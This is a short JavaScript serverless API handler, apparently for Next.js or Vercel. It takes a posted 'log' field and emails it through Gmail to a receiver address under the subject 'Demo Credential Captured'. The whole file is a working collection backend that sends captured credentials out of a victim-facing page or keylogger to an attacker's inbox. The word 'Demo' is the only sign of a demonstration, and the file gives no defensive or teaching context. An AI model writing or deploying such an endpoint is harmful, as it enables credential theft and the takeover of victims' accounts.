import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).send('Only POST allowed');
  }

  const { log } = req.body;

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL,
      pass: process.env.EMAIL_PASS
    }
  });

  const mailOptions = {
    from: process.env.EMAIL,
    to: process.env.RECEIVER,
    subject: '🔐 Demo Credential Captured',
    text: log
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).send('Email sent!');
  } catch (err) {
    console.error('Email error:', err);
    res.status(500).send('Email failed.');
  }
}
